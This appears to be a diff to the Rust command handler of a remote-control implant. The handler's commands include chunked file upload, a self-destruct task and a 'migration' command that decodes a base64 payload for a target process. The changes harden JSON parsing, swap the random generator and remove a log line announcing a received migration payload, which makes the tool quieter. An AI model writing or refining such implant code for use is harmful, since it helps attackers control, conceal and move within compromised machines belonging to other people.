@@ -280,8 +280,10 @@ impl MessageHandler {
             "file_upload_chunk" => {
                 // 分块上传文件
                 if let (Some(path), Some(data)) = (command_payload.path.as_deref(), command_payload.data.as_deref()) {
-                    let is_append = command_payload.command_content.contains("\"is_append\":true") 
-                                 || command_payload.command_content.contains("\"is_append\": true");
+                    let is_append = serde_json::from_str::<serde_json::Value>(&command_payload.command_content)
+                        .ok()
+                        .and_then(|v| v.get("is_append")?.as_bool())
+                        .unwrap_or(false);
                     match crate::fs::upload_chunk(path, data, is_append) {
                         Ok(_) => CommandResult {
                             stdout: format!("Chunk uploaded: {}", path),
@@ -445,7 +447,7 @@ impl MessageHandler {
                     data: vec![],
                     args: vec![],
                     metadata: None,
-                    task_id: format!("self_destruct_{:08x}", rand::random::<u32>()),
+                    task_id: format!("self_destruct_{:08x}", crate::utils::next_u32()),
                     req_id: command_payload.req_id.clone(),
                     plugin_id: None,
                 };
@@ -593,7 +595,6 @@ impl MessageHandler {
                 // 1. Resolve Target and Payload
                 let target_str = command_payload.command_content.trim();
                 let payload_b64 = command_payload.data.as_deref().unwrap_or("");
-                println!("[!] Migration command received. Payload size: {} bytes", payload_b64.len());
                 
                 let payload = match base64::engine::general_purpose::STANDARD.decode(payload_b64.trim()) {
                     Ok(data) => data,
